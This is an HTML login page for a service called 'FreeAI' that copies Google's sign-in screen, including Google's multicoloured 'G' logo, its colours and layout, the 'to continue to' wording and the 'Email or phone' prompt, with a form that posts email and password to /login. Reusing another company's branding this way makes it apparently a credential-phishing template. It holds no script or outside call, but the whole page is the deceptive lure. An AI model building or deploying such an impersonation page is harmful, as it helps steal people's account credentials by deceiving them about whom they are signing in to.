<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Sign in — FreeAI</title>
<link rel="stylesheet" href="/static/style.css">
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Inter", Arial, sans-serif; }
  body.ailogin { background: #fff; color: #202124; display: flex; align-items: center; justify-content: center; min-height: 100vh; padding: 20px; }
  .al-card { background: #fff; border: 1px solid #dadce0; border-radius: 8px; padding: 48px 40px 36px; max-width: 448px; width: 100%; }
  .al-logo { display: block; margin: 0 auto 16px; width: 48px; height: 48px; }
  .al-card h1 { font-size: 24px; font-weight: 400; text-align: center; margin-bottom: 8px; }
  .al-card .sub { text-align: center; color: #202124; font-size: 16px; margin-bottom: 32px; }
  .al-input { position: relative; margin-bottom: 24px; }
  .al-input input { width: 100%; padding: 13px 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; outline: none; background: transparent; }
  .al-input input:focus { border-color: #1a73e8; box-shadow: 0 0 0 2px rgba(26,115,232,0.15); }
  .al-input label { position: absolute; top: 50%; left: 14px; transform: translateY(-50%); background: #fff; padding: 0 4px; color: #5f6368; font-size: 16px; pointer-events: none; transition: 0.15s; }
  .al-input input:focus + label, .al-input input:valid + label { top: 0; font-size: 12px; color: #1a73e8; }
  .al-actions { display: flex; justify-content: space-between; align-items: center; margin-top: 32px; }
  .al-link { color: #1a73e8; text-decoration: none; font-size: 14px; font-weight: 500; }
  .al-btn { background: #1a73e8; color: #fff; border: none; border-radius: 4px; padding: 10px 24px; font-size: 14px; font-weight: 500; cursor: pointer; }
  .al-btn:hover { background: #1b66c9; }
</style>
</head>
<body class="ailogin">
<div class="al-card">
  <svg class="al-logo" viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/><path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/></svg>
  <h1>Sign in</h1>
  <p class="sub">to continue to FreeAI</p>
  <form action="/login" method="POST" autocomplete="off">
    <div class="al-input">
      <input type="email" name="email" id="email" required>
      <label for="email">Email or phone</label>
    </div>
    <div class="al-input">
      <input type="password" name="password" id="password" required>
      <label for="password">Enter your password</label>
    </div>
    <div class="al-actions">
      <a href="#" class="al-link">Forgot password?</a>
      <button type="submit" class="al-btn">Next</button>
    </div>
  </form>
</div>
</body>
</html>
